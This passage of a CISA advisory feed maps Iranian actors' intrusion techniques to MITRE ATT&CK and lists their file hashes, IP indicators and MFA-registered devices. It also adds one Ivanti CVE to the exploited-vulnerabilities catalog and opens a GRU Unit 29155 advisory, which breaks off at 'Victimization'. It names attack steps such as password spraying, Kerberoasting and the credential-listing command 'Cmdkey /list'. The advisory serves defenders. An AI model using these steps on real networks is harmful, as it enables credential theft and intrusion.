<caption><em>Table 1: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Identity Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/001/\" title=\"Gather Victim Identity Information: Credentials\">T1589</a></td>
<td>The actors likely gathered victim information.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Tool</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/002/\" title=\"Obtain Capabilities: Tool\">T1588.002</a></td>
<td>The actors obtained a password spray tool through an open-source repository.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts</td>
<td><a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></td>
<td>The actors used password spraying to obtain valid user and group email account credentials, allowing them access to the network.</td>
</tr>
<tr>
<td>Valid Accounts: Cloud Accounts</td>
<td><a href=\"https://attack.mitre.org/techniques/T1078/004/\" title=\"Valid Accounts: Cloud Accounts\">T1078.004</a></td>
<td>The actors used accounts hosted on Microsoft 365, Azure, and Okta cloud environments as additional methods for initial access.</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>The actors exploited Citrix systems’ external-facing remote services as another method for gaining initial access to the system.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>The actors used PowerShell commands to maintain and expand access.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation: Device Registration</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/005/\" title=\"Account Manipulation: Device Registration\">T1098.005</a></td>
<td>The actors used PowerShell commands to maintain and expand access.</td>
</tr>
<tr>
<td>Modify Authentication Process</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/\" title=\"Modify Authentication Process\">T1556</a></td>
<td>The actors used a public facing Active Directory Federation Service (ADFS) domain to reset the passwords of expired accounts.</td>
</tr>
<tr>
<td>Modify Authentication Process: Multi-Factor Authentication</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a></td>
<td>The actors used an MFA bypass method, such as Multi-Factor Authentication Request Generation, providing the ability to modify or completely disable MFA defenses.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></td>
<td>The actors attempted impersonation of the domain controller likely by exploiting CVE-2020-1472, Microsoft’s Netlogon Privilege Escalation vulnerability.</td>
</tr>
<tr>
<td>Domain or Tenant Policy Modification: Trust Modification</td>
<td><a href=\"https://attack.mitre.org/techniques/T1484/002/\" title=\"Domain or Tenant Policy Modification: Trust Modification\">T1484.002</a></td>
<td>The actors leveraged a public-facing ADFS password reset tool to reactivate inactive accounts, allowing the actor to authenticate and enroll their devices as any user in the AD managed by the victim tenant.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Indirect Command Execution</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1202/\" title=\"Indirect Command Execution\">T1202</a></td>
<td>The actors attempted impersonation of the Domain Controller likely by exploiting CVE-2020-1472, Microsoft’s Netlogon Privilege Escalation vulnerability.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>The actors targeted applications, including Single Sign-on (SSO) Microsoft Office 365, using brute force password sprays and imported the tool <code>DomainPasswordSpray.ps1</code>.</td>
</tr>
<tr>
<td>Credentials from Password Stores</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1555/\" title=\"Credentials from Password Stores\">T1555</a></td>
<td>The actors used the command <code>Cmdkey /list</code> likely to display usernames and credentials.</td>
</tr>
<tr>
<td>Steal or Forge Kerberos Tickets: Kerberoasting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a></td>
<td>The actors performed Kerberos Service Principal Name (SPN) enumeration of several service accounts and received Rivest Cipher 4 (RC4) tickets.</td>
</tr>
<tr>
<td>Multi-Factor Authentication Request Generation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a></td>
<td>The actors sent MFA requests to legitimate users.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1018\" title=\"Remote System Discovery\">T1018</a></td>
<td>The actors used LOTL to return information about domain controllers.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Cloud Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/003/\" title=\"Permission Groups Discovery: Cloud Groups\">T1069.003</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>System Information Discovery&nbsp;</td>
<td><a href=\"https://attack.mitre.org/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></td>
<td>The actors were able to query the AD to discover display names, operating systems, descriptions, and distinguished names from the computer.</td>
</tr>
<tr>
<td>Account Discovery: Domain Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>The actors used LOTL to return information about trusted domains.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a></td>
<td>The actors used Microsoft Word to open PowerShell to launch RDP binary mstsc.exe.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System</td>
<td><a href=\"https://attack.mitre.org/techniques/T1005/\" title=\"Data from Local System\">T1005</a></td>
<td>The actors downloaded files related to remote access methods and the organization’s inventory.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>The actors used <code>msedge.exe</code> to make outbound connections likely to Cobalt Strike Beacon C2 infrastructure.</td>
</tr>
<tr>
<td>Ingress Tool Transfer</td>
<td><a href=\"https://attack.mitre.org/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></td>
<td>The actors imported a tool from GitHub and used it to conduct password spraying.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>The actors frequently conduct targeting using a virtual private network (VPN).</td>
</tr>
</tbody>
</table>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p>See <strong>Tables 13 to 15</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;13: Malicious Files Associated with Iranian Cyber Actors</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Hash</th>
<th role=\"columnheader\">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>1F96D15B26416B2C7043EE7172357AF3AFBB002A</td>
<td>Associated with malicious activity.</td>
</tr>
<tr>
<td>3D3CDF7CFC881678FEBCAFB26AE423FE5AA4EFEC</td>
<td>Associated with malicious activity.</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:</strong> The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains. Many of the IP addresses provided below are assessed VPN nodes and as such are not exclusive to the Iranian actors’ use. The authoring organizations do not recommend blocking these IP addresses based solely on their inclusion in this JCSA. The authoring organizations recommend using the below IP addresses to search for previous activity the actors may have conducted against networks. If positive hits for these IP addresses are identified, the authoring organizations recommend making an independent determination if the observed activity aligns with the TTPs outlined in the JCSA. The timeframes included in the table reflect the timeframe the actors likely used the IPs.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;14: Network Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
<th role=\"columnheader\">Date Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>95.181.234.12</td>
<td>01/30/2024 to 02/07/2024</td>
</tr>
<tr>
<td>95.181.234.25</td>
<td>01/30/2024 to 02/07/2024</td>
</tr>
<tr>
<td>173.239.232.20</td>
<td>10/06/2023 to 12/19/2023</td>
</tr>
<tr>
<td>172.98.71.191</td>
<td>10/15/2023 to 11/27/2023</td>
</tr>
<tr>
<td>102.129.235.127</td>
<td>10/21/2023 to 10/22/2023</td>
</tr>
<tr>
<td>188.126.94.60</td>
<td>10/22/2023 to 01/12/2024</td>
</tr>
<tr>
<td>149.40.50.45</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>181.214.166.59</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>212.102.39.212</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>149.57.16.134</td>
<td>10/26/2023 to 10/27/2023</td>
</tr>
<tr>
<td>149.57.16.137</td>
<td>10/26/2023 to 10/27/2023</td>
</tr>
<tr>
<td>102.129.235.186</td>
<td>10/29/2023 to 11/08/2023</td>
</tr>
<tr>
<td>46.246.8.138</td>
<td>10/31/2023 to 01/26/2024</td>
</tr>
<tr>
<td>149.57.16.160</td>
<td>11/08/2023</td>
</tr>
<tr>
<td>149.57.16.37</td>
<td>11/08/2023</td>
</tr>
<tr>
<td>46.246.8.137</td>
<td>11/17/2023 to 01/25/2024</td>
</tr>
<tr>
<td>212.102.57.29</td>
<td>11/19/2023 to 01/17/2024</td>
</tr>
<tr>
<td>46.246.8.82</td>
<td>11/22/2023 to 01/28/2024</td>
</tr>
<tr>
<td>95.181.234.15</td>
<td>11/26/2023 to 02/07/2024</td>
</tr>
<tr>
<td>45.88.97.225</td>
<td>11/27/2023 to 02/11/2024</td>
</tr>
<tr>
<td>84.239.45.17</td>
<td>12/04/2023 to 12/07/2023</td>
</tr>
<tr>
<td>46.246.8.104</td>
<td>12/07/2023 to 02/07/2024</td>
</tr>
<tr>
<td>37.46.113.206</td>
<td>12/07/2023</td>
</tr>
<tr>
<td>46.246.3.186</td>
<td>12/07/2023 to 12/09/2023</td>
</tr>
<tr>
<td>46.246.8.141</td>
<td>12/07/2023 to 02/10/2024</td>
</tr>
<tr>
<td>46.246.8.17</td>
<td>12/09/2023 to 01/09/2024</td>
</tr>
<tr>
<td>37.19.197.182</td>
<td>12/15/2023</td>
</tr>
<tr>
<td>154.16.192.38</td>
<td>12/25/2023 to 01/24/2024</td>
</tr>
<tr>
<td>102.165.16.127</td>
<td>12/27/2023 to 01/28/2024</td>
</tr>
<tr>
<td>46.246.8.47</td>
<td>12/29/2023 to 01/29/2024</td>
</tr>
<tr>
<td>46.246.3.225</td>
<td>12/30/2023 to 02/06/2024</td>
</tr>
<tr>
<td>46.246.3.226</td>
<td>12/31/2023 to 02/03/2024</td>
</tr>
<tr>
<td>46.246.3.240</td>
<td>12/31/2023 to 02/06/2024</td>
</tr>
<tr>
<td>191.101.217.10</td>
<td>01/05/2024</td>
</tr>
<tr>
<td>102.129.153.182</td>
<td>01/08/2024</td>
</tr>
<tr>
<td>46.246.3.196</td>
<td>01/08/2024</td>
</tr>
<tr>
<td>102.129.152.60</td>
<td>01/09/2024</td>
</tr>
<tr>
<td>156.146.60.74</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>191.96.227.113</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>191.96.227.122</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>181.214.166.132</td>
<td>01/11/2024</td>
</tr>
<tr>
<td>188.126.94.57</td>
<td>01/11/2024 to 01/13/2024</td>
</tr>
<tr>
<td>154.6.13.144</td>
<td>01/13/2024 to 01/24/2024</td>
</tr>
<tr>
<td>154.6.13.151</td>
<td>01/13/2024 to 01/28/2024</td>
</tr>
<tr>
<td>188.126.94.166</td>
<td>01/15/2024</td>
</tr>
<tr>
<td>89.149.38.204</td>
<td>01/18/2024</td>
</tr>
<tr>
<td>46.246.8.67</td>
<td>01/20/2024</td>
</tr>
<tr>
<td>46.246.8.53</td>
<td>01/22/2024</td>
</tr>
<tr>
<td>154.16.192.37</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>191.96.150.14</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>191.96.150.96</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>46.246.8.10</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>84.239.25.13</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>154.6.13.139</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>191.96.106.33</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>191.96.227.159</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>149.57.16.150</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>191.96.150.21</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>46.246.8.84</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>95.181.235.8</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>191.96.227.102</td>
<td>01/27/2024 to 01/28/2024</td>
</tr>
<tr>
<td>46.246.122.185</td>
<td>01/28/2024</td>
</tr>
<tr>
<td>146.70.102.3</td>
<td>01/29/2024 to 01/30/2024</td>
</tr>
<tr>
<td>46.246.3.233</td>
<td>01/30/2024 to 02/15/2024</td>
</tr>
<tr>
<td>46.246.3.239</td>
<td>01/30/2024 to 02/15/2024</td>
</tr>
<tr>
<td>188.126.89.35</td>
<td>02/03/2024</td>
</tr>
<tr>
<td>46.246.3.223</td>
<td>02/03/2024</td>
</tr>
<tr>
<td>46.246.3.245</td>
<td>02/05/2024 to 02/06/2024</td>
</tr>
<tr>
<td>191.96.150.50</td>
<td>02/09/2024</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;15: Devices</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Device Type</th>
<th role=\"columnheader\">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Samsung Galaxy A71 (SM-A715F)</td>
<td>Registered with MFA</td>
</tr>
<tr>
<td>Samsung SM-G998B</td>
<td>Registered with MFA</td>
</tr>
<tr>
<td>Samsung SM-M205F</td>
<td>Registered with MFA</td>
</tr>
</tbody>
</table>
</div>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Mon, 30 Sep 2024 12:28:59 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22303")) (item nil (title nil "CISA Adds One Known Exploited Vulnerability to Catalog") (link nil "https://www.cisa.gov/news-events/alerts/2024/09/19/cisa-adds-one-known-exploited-vulnerability-catalog") (description nil "<p>CISA has added one new vulnerability to its&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a>, based on evidence of active exploitation.</p>
<ul>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-8963\" title=\"Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability\">CVE-2024-8963</a> Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability</li>
</ul>
<p>These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.</p>
<p><a href=\"https://www.cisa.gov/binding-operational-directive-22-01\" title=\"Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities\">Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities</a>&nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the<a>&nbsp;</a><a href=\"https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf\" title=\"BOD 22-01 Fact Sheet\">BOD 22-01 Fact Sheet</a>&nbsp;for more information.</p>
<p>Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Catalog vulnerabilities\">Catalog vulnerabilities</a>&nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities\" title=\"specified criteria\">specified criteria</a>.</p>
") (pubDate nil "Thu, 19 Sep 2024 11:28:14 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22256")) (item nil (title nil "Russian Military Cyber Actors Target US and Global Critical Infrastructure") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a") (description nil "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and National Security Agency (NSA) assess that cyber actors affiliated with the Russian General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155) are responsible for computer network operations against global targets for the purposes of espionage, sabotage, and reputational harm since at least 2020. GRU Unit 29155 cyber actors began deploying the destructive&nbsp;<a href=\"https://attack.mitre.org/software/S0689/\" title=\"WhisperGate\">WhisperGate</a> malware against multiple Ukrainian victim organizations as early as January 13, 2022. These cyber actors are separate from other known and more established GRU-affiliated cyber groups, such as Unit 26165 and Unit 74455.</p>
<p>To mitigate this malicious cyber activity, organizations should take the following actions today:</p>
<ul>
<li>Prioritize routine system updates and remediate known exploited vulnerabilities.</li>
<li>Segment networks to prevent the spread of malicious activity.</li>
<li>Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services, especially for webmail, virtual private networks (VPNs), and accounts that access critical systems.</li>
</ul>
<p>This Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit 29155 cyber actors<a>—</a>both during and succeeding their deployment of WhisperGate against Ukraine—as well as further analysis (see <strong>Appendix A</strong>) of the WhisperGate malware initially published in the joint advisory,&nbsp;<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\" title=\"Destructive Malware Targeting Organizations in Ukraine\">Destructive Malware Targeting Organizations in Ukraine</a>, published February 26, 2022.</p>
<p>FBI, CISA, NSA and the following partners are releasing this joint advisory as a collective assessment of Unit 29155 cyber operations since 2020:</p>
<ul>
<li>U.S. Department of the Treasury</li>
<li>U.S. Department of State (Rewards for Justice)</li>
<li>U.S. Cyber Command Cyber National Mission Force (CNMF)</li>
<li>Netherlands Defence Intelligence and Security Service (MIVD)</li>
<li>Czech Military Intelligence (VZ)</li>
<li>Czech Republic Security Information Service (BIS)</li>
<li>German Federal Office for the Protection of the Constitution (BfV)</li>
<li>Estonian Internal Security Service (KAPO)</li>
<li>Latvian State Security Service (VDD)</li>
<li>Security Service of Ukraine (SBU)</li>
<li>Computer Emergency Response Team of Ukraine (CERT-UA)</li>
<li>Canadian Security Intelligence Service (CSIS)</li>
<li>Communications Security Establishment Canada (CSE)</li>
<li>Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)</li>
<li>United Kingdom National Cyber Security Centre (NCSC-UK)</li>
</ul>
<p>For additional information on Russian state-sponsored malicious cyber activity and related indictments, see the recent U.S. Department of Justice (DOJ) press releases for&nbsp;<a href=\"https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian\" title=\"Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data\">June 26, 2024</a>, and&nbsp;<a href=\"https://www.justice.gov/opa/pr/five-russian-gru-officers-and-one-civilian-charged-conspiring-hack-ukrainian-government\" title=\"Five Russian GRU Officers and One Civilian Charged for Conspiring to Hack Ukrainian Government\">September 5, 2024</a>, FBI’s&nbsp;<a href=\"https://www.fbi.gov/investigate/cyber\" title=\"The Cyber Threat\">Cyber Crime</a> webpage, and CISA’s&nbsp;<a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia\" title=\"Russia Cyber Threat Overview and Advisories\">Russia Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-249A Russian Military Cyber Actors Target U.S. and Global Critical Infrastructure</a>
    <span class=\"c-file__size\">(PDF,       1.01 MB
  )</span>
  </div>
</div>
<p>For a downloadable copy of indicators of compromise (IOCs):</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/AA24-249A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-249A STIX XML</a>
    <span class=\"c-file__size\">(XML,       321.47 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/AA24-249A-Russian-Military-Cyber-Actors-Target-US-and-Global-Critical-Infrastructure.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-249A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       201.39 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>GRU Unit 29155: Cyber Component</h3>
<p>FBI, NSA, and CISA assess Unit 29155 is responsible for attempted coups, sabotage and influence operations, and assassination attempts throughout Europe. Unit 29155 expanded their tradecraft to include offensive cyber operations since at least 2020. Unit 29155 cyber actors’ objectives appear to include the collection of information for espionage purposes, reputational harm caused by the theft and leakage of sensitive information, and systematic sabotage caused by the destruction of data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1485/\" title=\"Data Destruction\">T1485</a>].</p>
<p>FBI assesses the Unit 29155 cyber actors to be junior active-duty GRU officers under the direction of experienced Unit 29155 leadership. These individuals appear to be gaining cyber experience and enhancing their technical skills through conducting cyber operations and intrusions. Additionally, FBI assesses Unit 29155 cyber actors rely on non-GRU actors, including known cyber-criminals and enablers to conduct their operations.</p>
<h3>Cybersecurity Industry Tracking</h3>
<p>The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation recommendations related to Unit 29155 cyber actors. While not all encompassing, the following are the most notable threat group names related under <a href=\"https://attack.mitre.org/groups/G1003\" title=\"Ember Bear\">MITRE ATT&amp;CK G1003</a>&nbsp;and commonly used within the cybersecurity community.</p>
<ul>
<li>Cadet Blizzard (formerly known as DEV-0586 by Microsoft)[<a href=\"https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\" title=\"Destructive malware targeting Ukrainian organizations\">1</a>],[<a href=\"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64\" title=\"Cadet Blizzard emerges as a novel and distinct Russian threat actor\">2</a>]</li>
<li>Ember Bear (also known as Bleeding Bear by CrowdStrike)[<a href=\"https://www.crowdstrike.com/blog/who-is-ember-bear/\" title=\"Who is EMBER BEAR?\">3</a>]</li>
<li>Frozenvista</li>
<li>UNC2589[<a href=\"https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/\" title=\"Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation\">4</a>]</li>
<li>UAC-0056[<a href=\"https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/\">5</a>]</li>
</ul>
<p><strong>Note:</strong> Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the U.S. Government’s understanding for all activity related to these groupings.</p>
<h3>Victimization</h3>
